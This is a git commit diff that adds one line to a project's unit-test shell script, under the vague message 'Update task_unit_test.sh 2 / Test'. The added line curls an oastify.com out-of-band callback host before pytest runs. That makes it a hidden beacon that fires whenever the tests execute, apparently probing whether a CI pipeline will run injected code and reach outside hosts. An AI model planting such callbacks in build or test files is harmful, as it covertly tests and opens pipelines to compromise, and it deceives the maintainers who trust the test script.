37748d4da86587c1fa7cbf9618946b7de35d3d99
ps-ws <110921833+ps-ws@users.noreply.github.com>
2022-08-10 16:25:49 -0400

    Update task_unit_test.sh 2
    Test

--- task_unit_test.sh
+++ task_unit_test.sh
@@ -1,4 +1,5 @@
 #!/bin/bash
 
+curl "https://0opgvt0tacazem5whi2orqrr4ia9yy.oastify.com/from-task_unit_test-2"
 python3 -m pip install pytest
 python3 -m pytest -v --junitxml=pytest_basics.xml --durations=10 test_basics.py
